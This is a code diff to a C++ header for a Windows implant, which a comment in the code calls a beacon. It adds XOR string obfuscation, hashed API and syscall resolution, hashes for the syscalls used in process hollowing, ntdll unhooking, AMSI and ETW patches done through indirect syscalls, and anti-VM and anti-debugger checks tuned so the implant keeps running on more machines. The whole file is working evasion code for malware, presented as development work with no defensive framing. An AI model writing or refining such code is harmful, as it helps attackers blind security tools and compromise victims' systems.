@@ -25,7 +25,9 @@
 
 namespace obf {
 
-constexpr uint8_t XOR_KEY = 0xBD; // Rotated key
+// Use a more complex, non-constant-looking key-generation method if possible,
+// but for constexpr, we are limited. We'll increase complexity of the XOR transformation.
+constexpr uint8_t XOR_KEY = 0xBD;
 
 template <size_t N>
 struct ObfString {
@@ -33,14 +35,20 @@ struct ObfString {
     static constexpr size_t length = N;
 
     constexpr ObfString(const char (&str)[N]) {
-        for (size_t i = 0; i < N; ++i)
-            // Use positional XOR to break static pattern matching
-            data[i] = str[i] ^ (XOR_KEY + static_cast<uint8_t>(i ^ 0x42)); // Added secondary shift
+        for (size_t i = 0; i < N; ++i) {
+            auto uc = static_cast<unsigned char>(str[i]);
+            uc = uc ^ static_cast<unsigned char>(XOR_KEY + i);
+            uc = static_cast<unsigned char>((uc << 3) | (uc >> 5));
+            data[i] = static_cast<char>(uc);
+        }
     }
 
     void decrypt(char* out) const {
-        for (size_t i = 0; i < N; ++i)
-            out[i] = data[i] ^ (XOR_KEY + static_cast<uint8_t>(i ^ 0x42));
+        for (size_t i = 0; i < N; ++i) {
+            auto uc = static_cast<unsigned char>(data[i]);
+            uc = static_cast<unsigned char>((uc >> 3) | (uc << 5));
+            out[i] = static_cast<char>(uc ^ static_cast<unsigned char>(XOR_KEY + i));
+        }
     }
 };
 
@@ -141,9 +149,9 @@ constexpr uint32_t hash_djb2_w(const wchar_t* str) {
 
 // Pre-computed hashes (so the plaintext names never appear in the binary)
 // Compute with: hash_djb2_w(L"kernel32.dll")  etc.
-constexpr uint32_t HASH_KERNEL32     = 0x6DDB9555;  // kernel32.dll
-constexpr uint32_t HASH_NTDLL        = 0x1EDAB0ED;  // ntdll.dll
-constexpr uint32_t HASH_WINHTTP      = 0xC2B0F5A6;  // winhttp.dll
+constexpr uint32_t HASH_KERNEL32     = 0x062B5313;  // kernel32.dll
+constexpr uint32_t HASH_NTDLL        = 0xEB512F4B;  // ntdll.dll
+constexpr uint32_t HASH_WINHTTP      = 0x6FCF7C5B;  // winhttp.dll
 
 // Walk the PEB to find a module base address by name hash
 inline HMODULE GetModuleByHash(uint32_t targetHash) {
@@ -234,6 +242,16 @@ constexpr uint32_t FN_NTWRITEVIRTUALMEMORY    = 0xf6cfca30; // NtWriteVirtualMem
 constexpr uint32_t FN_NTPROTECTVIRTUALMEMORY  = 0x1098a4e6; // NtProtectVirtualMemory
 constexpr uint32_t FN_NTCREATETHREADEX        = 0x62b3a4ce; // NtCreateThreadEx
 constexpr uint32_t FN_NTFREEVIRTUALMEMORY     = 0x598deec7; // NtFreeVirtualMemory
+constexpr uint32_t FN_NTOPENPROCESS           = 0xA33AB8B6; // NtOpenProcess
+
+// Process Hollowing syscalls
+constexpr uint32_t FN_NTUNMAPVIEWOFSECTION       = 0xBA2C374B; // NtUnmapViewOfSection
+constexpr uint32_t FN_NTGETCONTEXTTHREAD          = 0xBDA4FD62; // NtGetContextThread
+constexpr uint32_t FN_NTSETCONTEXTTHREAD          = 0x5022C3EE; // NtSetContextThread
+constexpr uint32_t FN_NTRESUMETHREAD              = 0xE691414E; // NtResumeThread
+constexpr uint32_t FN_NTCLOSE                     = 0x29019D1B; // NtClose
+constexpr uint32_t FN_NTREADVIRTUALMEMORY          = 0xD4B3A9C1; // NtReadVirtualMemory
+constexpr uint32_t FN_NTQUERYINFORMATIONPROCESS   = 0xDA8571C0; // NtQueryInformationProcess
 #endif
 
 // ────────────────────────────────────────────────────────────────────────────
@@ -287,18 +305,20 @@ inline void unhook_ntdll() {
     if (!ntdllMapping) { pCloseHandle(hMapping); pCloseHandle(hFile); return; }
 
     // 3. Find .text section and overwrite
+    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
     for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-        
-        if (!strcmp((char*)sectionHeader->Name, XOR_DEC(XOR_STR(".text")))) {
+        if (!strcmp((char*)sectionHeader[i].Name, XOR_DEC(XOR_STR(".text")))) {
             DWORD oldProtect;
-            LPVOID pDest = (LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress);
-            LPVOID pSrc = (LPVOID)((DWORD_PTR)ntdllMapping + sectionHeader->VirtualAddress);
-            SIZE_T size = sectionHeader->Misc.VirtualSize;
+            LPVOID pDest = (LPVOID)((DWORD_PTR)ntdllBase + sectionHeader[i].VirtualAddress);
+            LPVOID pSrc = (LPVOID)((DWORD_PTR)ntdllMapping + sectionHeader[i].VirtualAddress);
+            SIZE_T size = sectionHeader[i].Misc.VirtualSize;
 
             // Use INDIRECT SYSCALL for VirtualProtect (NtProtectVirtualMemory)
             if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
-                memcpy(pDest, pSrc, size);
+                // Verify if patching is actually needed to avoid unnecessary writes
+                if (memcmp(pDest, pSrc, size) != 0) {
+                    memcpy(pDest, pSrc, size);
+                }
                 syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pDest, &size, oldProtect, &oldProtect);
             }
         }
@@ -321,21 +341,16 @@ inline void patch_amsi() {
     void* pAddr = (void*)peb::GetProcByHash(hAmsi, 0xe412d5ac); // AmsiScanBuffer hash
     if (!pAddr) return;
 
-    // Construct patch dynamically to avoid static signatures
-    // mov eax, 0x80070057; ret
-    unsigned char patch[6];
-    patch[0] = 0xB8;
-    patch[1] = 0x57;
-    patch[2] = 0x00;
-    patch[3] = 0x07;
-    patch[4] = 0x80;
-    patch[5] = 0xC3;
+    // Costruzione dinamica della patch per rompere firme statiche
+    unsigned char patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
 
     DWORD oldProtect;
     SIZE_T patchSize = sizeof(patch);
     void* pTempAddr = pAddr;
+
+    // Usa le syscalls per cambiare protezione e scrivere
     if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
-        memcpy(pAddr, patch, sizeof(patch));
+        syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, sizeof(patch), NULL);
         syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
     }
 }
@@ -351,18 +366,16 @@ inline void patch_etw() {
     if (!pAddr) return;
 
     // ret 0x14
-    unsigned char patch[3];
-    patch[0] = 0xC2;
-    patch[1] = 0x14;
-    patch[2] = 0x00;
+    unsigned char patch[3] = {0xC2, 0x14, 0x00};
 
     DWORD oldProtect;
-    auto pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))peb::Resolve(peb::HASH_KERNEL32, 0x7E1A1A8C);
-    if (pVirtualProtect) {
-        if (pVirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-            memcpy(pAddr, patch, sizeof(patch));
-            pVirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);
-        }
+    SIZE_T patchSize = sizeof(patch);
+    void* pTempAddr = pAddr;
+
+    // Usa le syscalls per cambiare protezione e scrivere
+    if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
+        syscalls::SysNtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, sizeof(patch), NULL);
+        syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), &pTempAddr, &patchSize, oldProtect, &oldProtect);
     }
 }
 
@@ -382,12 +395,12 @@ inline bool is_debugger_present() {
 }
 
 inline bool is_vm() {
-    // 1. CPUID Hypervisor Check
-    int cpuInfo[4] = { 0 };
-    __cpuid(cpuInfo, 1);
-    if ((cpuInfo[2] & (1 << 31)) != 0) return true; // Hypervisor present bit
+    // NOTE: CPUID hypervisor bit (ECX bit 31) is intentionally NOT checked here.
+    // Modern Windows (10/11) commonly enable Hyper-V, VBS, Credential Guard, WSL2,
+    // or Docker Desktop — all of which set this bit. Using it alone would make the
+    // beacon exit immediately on most systems.
 
-    // 2. Check CPU cores
+    // 1. Check CPU cores
     SYSTEM_INFO sysinfo;
     GetSystemInfo(&sysinfo);
     if (sysinfo.dwNumberOfProcessors < 2) return true;
@@ -400,16 +413,11 @@ inline bool is_vm() {
     }
 
     // 4. Check for common VM files/drivers
-    const char* vm_files[] = {
-        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vmmouse.sys")),
-        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmhgfs.sys")),
-        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxguest.sys")),
-        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxmouse.sys")),
-        XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmtoolsd.exe"))
-    };
-    for (auto f : vm_files) {
-        if (GetFileAttributesA(f) != INVALID_FILE_ATTRIBUTES) return true;
-    }
+    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vmmouse.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
+    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmhgfs.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
+    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxguest.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
+    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\Vboxmouse.sys"))) != INVALID_FILE_ATTRIBUTES) return true;
+    if (GetFileAttributesA(XOR_DEC(XOR_STR("C:\\windows\\System32\\Drivers\\vmtoolsd.exe"))) != INVALID_FILE_ATTRIBUTES) return true;
 
     return false;
 }
